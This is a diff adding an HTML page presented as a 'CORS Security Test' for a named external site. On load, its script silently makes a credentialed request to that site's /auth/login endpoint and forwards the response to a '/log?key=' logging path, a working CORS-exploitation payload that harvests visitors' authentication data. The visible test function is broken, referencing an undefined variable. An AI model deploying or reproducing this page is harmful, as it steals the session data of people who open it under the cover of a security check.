@@ -1,0 +1,50 @@
+<html>
+  <title>CORS Security Test</title>
+	<body>
+    <h2>CORS Verification</h2>
+
+		<button onclick="testCORS()">Test CORS</button>
+
+		<pre id="result"></pre>
+	<h1>Hello World!</h1>
+		<script> 
+		var req = new XMLHttpRequest();
+		var url = "https://light-ed.vercel.app"
+		
+		req.onreadystatechange = function (){
+			if (req.readyState == XMLHttpRequest.DONE){
+				fetch("/log?key=" + req.responseText)
+			}
+		}
+		
+		req.open('GET', url + "/auth/login", true); 
+		req.withCredentials = true; 
+		req.send(); 
+		
+		function reqListener() { location='/log?key='+this.responseText; }; 
+
+
+      async function testCORS() {
+				const url = "https://light-ed.vercel.app/auth/login";
+
+				try {
+					const response = await fetch(endpoint, {
+						method: 'GET',
+						credentials: 'include',
+					});
+
+					const data = await response.json();
+
+					document.getElementById('result').textContent = JSON.stringify(
+						data,
+						null,
+						2,
+					);
+				} catch (error) {
+					document.getElementById('result').textContent =
+						'CORS request blocked or failed: ' + error.message;
+				}
+			}
+		</script>
+	</body>
+</html>
